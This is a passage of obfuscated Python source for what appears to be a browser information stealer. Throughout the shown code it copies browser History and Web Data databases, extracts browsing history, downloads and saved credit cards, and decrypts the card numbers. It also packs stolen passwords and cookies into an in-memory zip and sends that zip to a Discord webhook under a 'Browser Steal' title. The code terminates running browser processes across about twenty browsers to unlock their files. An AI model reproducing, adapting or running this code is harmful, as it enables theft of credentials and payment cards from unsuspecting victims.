            KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name = f"  Browser : {KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD}"
            RVZYPNNFNERFOKSZUIHULOAFKHENXOJAROJRYJUNHOIYZWOUMAZXFVEIMPMBJVSMMRXKJBFEN.append(f"{YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ}\n{EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL}\n{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\n{KQXBXJKNTJFZFPJWHLMBPUNMVDCQCFHIPVGJHWUZVBZHYYMZPINWKGNJHCEHIJXHIYSUWEVTFNFNALLKNBZFZXJXNMZU}\n{OCFUQGVELAMDGLPCOCQVZNYNFLZYLHMZNAFDLAQBFSMJMMLGVXFTSHVWTISGZRIGLUUWXVOVT}\n{KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name}\n")

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.close()

    def EBIOGKABKVKIVIMLKKINIDBKCFTMVFGMPUCGQKIHUQXLPTJMLA(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP):
        GXHUXNGGUJWUXTYEZXQHXMMUNKUNSGIZOXCPEJGVVVBDHHHRUCMSEA = os.path.join(QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, 'History')
        if not os.path.exists(GXHUXNGGUJWUXTYEZXQHXMMUNKUNSGIZOXCPEJGVVVBDHHHRUCMSEA):
            return
        
        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(GXHUXNGGUJWUXTYEZXQHXMMUNKUNSGIZOXCPEJGVVVBDHHHRUCMSEA)
        disk_conn.backup(WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ)
        disk_conn.close()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ = WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.cursor()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ =          f"- Url     : {v4r_row[0]}"
            WSWGOHGFKKBMOURPKITVHRUFOCWDNJHZWXDRILSKVRYHLDZEPZHWLQXGEFZODVMUVYAZIKJJDFJBXXRILYUZWLDUHOK =        f"  Title   : {v4r_row[1]}"
            CVLWZKYBAESBPCBVMGYCWJFEBWWRCVQXRJTDPEVRCSSTXDBZRTCJLITGRNBFWUKVYJDZZGGRTXNMDDYVSEFNVAETRCIVPPWNGSHD =         f"  Time    : {v4r_row[2]}"
            KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name = f"  Browser : {KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD}"
            ISBAJIRRQTOHBMZVMRQNMQMUMMJRERKJYGHOBRDGZAYBYWDZSCAOFHWHOMUNBCHGQFIXTVNJNKKCL.append(f"{YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ}\n{WSWGOHGFKKBMOURPKITVHRUFOCWDNJHZWXDRILSKVRYHLDZEPZHWLQXGEFZODVMUVYAZIKJJDFJBXXRILYUZWLDUHOK}\n{CVLWZKYBAESBPCBVMGYCWJFEBWWRCVQXRJTDPEVRCSSTXDBZRTCJLITGRNBFWUKVYJDZZGGRTXNMDDYVSEFNVAETRCIVPPWNGSHD}\n{KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name}\n")

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.close()

    def CVRINKMXKZQRDIOTVEQZCZFWICDIWLUPYKSVKTKJJNKDUUKYBMKOJJRWDMWAETPFZNPHHCD(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP):
        YSBKUXGEZNWXFCTVBSXYURIBUGSLHHSCJUDVILYOOCRFGAAAXUTJKXOXADJKVDNTK = os.path.join(QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, 'History')
        if not os.path.exists(YSBKUXGEZNWXFCTVBSXYURIBUGSLHHSCJUDVILYOOCRFGAAAXUTJKXOXADJKVDNTK):
            return

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(YSBKUXGEZNWXFCTVBSXYURIBUGSLHHSCJUDVILYOOCRFGAAAXUTJKXOXADJKVDNTK)
        disk_conn.backup(WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ)
        disk_conn.close()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ = WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.cursor()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.execute('SELECT tab_url, target_path FROM downloads')
        for row in OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.fetchall():
            if not row[0] or not row[1]:
                continue
            VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD =         f"- Path    : {row[1]}"
            YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ =          f"  Url     : {row[0]}"
            KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name = f"  Browser : {KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD}"
            FDAXYAKMOYRXMMRDSWWVACCIZIVCWQWRVEROHNYKRLLBBIMIBZBXGWTURHJCPMMMJPPPOFS.append(f"{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\n{YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ}\n{KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name}\n")

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.close()

    def PLQWATDUKJTLQVDZJBIMEUKGPHODGYBQMTMMGXPDATXSWMWIKQNAKCDLXRXTNBQPDJRMWTQDLZGXPZSSKBBYYMHSMFTPNLXB(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD):
        BQIQSIDIREYHSZQJYYZITNUYFGUFBRQKZCKSXNJKDISRHZYTRYPIRTK = os.path.join(QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, 'Web Data')
        if not os.path.exists(BQIQSIDIREYHSZQJYYZITNUYFGUFBRQKZCKSXNJKDISRHZYTRYPIRTK):
            return

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(BQIQSIDIREYHSZQJYYZITNUYFGUFBRQKZCKSXNJKDISRHZYTRYPIRTK)
        disk_conn.backup(WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ)
        disk_conn.close()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ = WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.cursor()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL =             f"- Name             : {v4r_row[0]}"
            MGXUUSVOLPEJOJOXGCXXBFDMDJGHZDWBTOOJTACTIXMXRXOKRYISAHJPWZBVKYDIDGBFMGEDGFLANUNNDQLVKPBJUV = f"  Expiration Month : {v4r_row[1]}"
            TPVDDKDCNNBGYQSEVTVYPMZQOHQDNOHSBTSXPZIXJVDZIHSGKOYAHHESFSAXZEEUESTAE =  f"  Expiration Year  : {v4r_row[2]}"
            UDUJOJWFAPPDHRVJXONRGFILAFENSIGZUYKAFQPYOGDRLOUSNNZQZNNNXMWTCF =      f"  Card Number      : {MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJI(v4r_row[3], DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD)}"
            HWUYJWQJQQADHOWLOERFROSAIGGFSUVKJNZAVKKBEPQEDBAWICFVKIMXMCIOWGUDWXZDGLIGWGUOVTCQGTTCEXVKJU =    f"  Date Modified    : {v4r_row[4]}"
            KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name =     f"  Browser          : {KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD}"
            STZNNIPQGKSYWJCRFONTKTNSDCGQMLYYXLBUAIWMDAIWHCWCZRMCZUIJDGIIRMTXAOGEPLQRTFTSDEQKXHKKU.append(f"{EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL}\n{MGXUUSVOLPEJOJOXGCXXBFDMDJGHZDWBTOOJTACTIXMXRXOKRYISAHJPWZBVKYDIDGBFMGEDGFLANUNNDQLVKPBJUV}\n{TPVDDKDCNNBGYQSEVTVYPMZQOHQDNOHSBTSXPZIXJVDZIHSGKOYAHHESFSAXZEEUESTAE}\n{UDUJOJWFAPPDHRVJXONRGFILAFENSIGZUYKAFQPYOGDRLOUSNNZQZNNNXMWTCF}\n{HWUYJWQJQQADHOWLOERFROSAIGGFSUVKJNZAVKKBEPQEDBAWICFVKIMXMCIOWGUDWXZDGLIGWGUOVTCQGTTCEXVKJU}\n{KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name}\n")
        
        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.close()

    def EKSNXEYTMIVNJEUCLDGJLCUBAIXDXJQLTSBOZIQKIRIUOFVHIYQJ(IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB):
        files_in_memory = {}

        if XHCLRQAILWGIQVLGNPQKFHVJKFXLISEEUEBXGJCXASLFYGFXHCKNUGAIEJXXVGTJIKMXJCV:
            files_in_memory[f"Passwords_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt"] = '\n'.join(XHCLRQAILWGIQVLGNPQKFHVJKFXLISEEUEBXGJCXASLFYGFXHCKNUGAIEJXXVGTJIKMXJCV)

        if RVZYPNNFNERFOKSZUIHULOAFKHENXOJAROJRYJUNHOIYZWOUMAZXFVEIMPMBJVSMMRXKJBFEN:
            files_in_memory[f"Cookies_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt"] = '\n'.join(RVZYPNNFNERFOKSZUIHULOAFKHENXOJAROJRYJUNHOIYZWOUMAZXFVEIMPMBJVSMMRXKJBFEN)

        if ISBAJIRRQTOHBMZVMRQNMQMUMMJRERKJYGHOBRDGZAYBYWDZSCAOFHWHOMUNBCHGQFIXTVNJNKKCL:
            files_in_memory[f"History_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt"] = '\n'.join(ISBAJIRRQTOHBMZVMRQNMQMUMMJRERKJYGHOBRDGZAYBYWDZSCAOFHWHOMUNBCHGQFIXTVNJNKKCL)

        if FDAXYAKMOYRXMMRDSWWVACCIZIVCWQWRVEROHNYKRLLBBIMIBZBXGWTURHJCPMMMJPPPOFS:
            files_in_memory[f"Downloads_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt"] = '\n'.join(FDAXYAKMOYRXMMRDSWWVACCIZIVCWQWRVEROHNYKRLLBBIMIBZBXGWTURHJCPMMMJPPPOFS)

        if STZNNIPQGKSYWJCRFONTKTNSDCGQMLYYXLBUAIWMDAIWHCWCZRMCZUIJDGIIRMTXAOGEPLQRTFTSDEQKXHKKU:
            files_in_memory[f"Cards_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt"] = '\n'.join(STZNNIPQGKSYWJCRFONTKTNSDCGQMLYYXLBUAIWMDAIWHCWCZRMCZUIJDGIIRMTXAOGEPLQRTFTSDEQKXHKKU)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def GXXSJALNMUFVUQUYOXXMBWQOXTVGLOGDWLWLHHWQXBKJZTWTCPMBFGUMOPTWXDUITMTAPJPQFBTGCHQDMWNHIOZRESFVMKV(IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB, zip_in_memory):
        OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER = SyncWebhook.from_url(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)
        OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER.send(
            embed=Embed(
                title=f'Browser Steal {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:',
                description=f"Found In **{'**, **'.join(BYMKWZNUWYYMBUCCMKXQFSUFWXRWVTVSHDZEIMWVAOTEXJUAZRSQXMLXQXIOODD)}**: ```📂 - Browser_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.zip\n├── 📄 - Cards_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt\n├── 📄 - Cookies_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt\n├── 📄 - Downloads_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt\n├── 📄 - History_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt\n└── 📄 - Passwords_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.txt```",
                color=UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG,
            ).set_footer(
                text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG,
                icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.zip"), 
            username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU, avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW
        )
        
    KYIYSPNPVEYMNVYUWAOOZZPTCKVEQMXGBMXDLHPPZGTIHPUBYEOBYIILWR = {
        'Google Chrome': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Amigo', 'User Data'),
        'Torch': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Torch', 'User Data'),
        'Kometa': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM, 'Apple Computer', 'Safari'),
    }

    KYIYSPNPVEYMNVYUWAOOZZPTCKVEQMXGBMXDLHPPZGTIHPUBYEOBYIILWR_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    FMUCOFADZEDGJEQRLURSVGHWAJVDPVAUQIPUUZJGAFXTQESJTIZXTRWREHUXULVMWIQIV = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in KYIYSPNPVEYMNVYUWAOOZZPTCKVEQMXGBMXDLHPPZGTIHPUBYEOBYIILWR_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD in KYIYSPNPVEYMNVYUWAOOZZPTCKVEQMXGBMXDLHPPZGTIHPUBYEOBYIILWR.items():
        if not os.path.exists(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
            continue

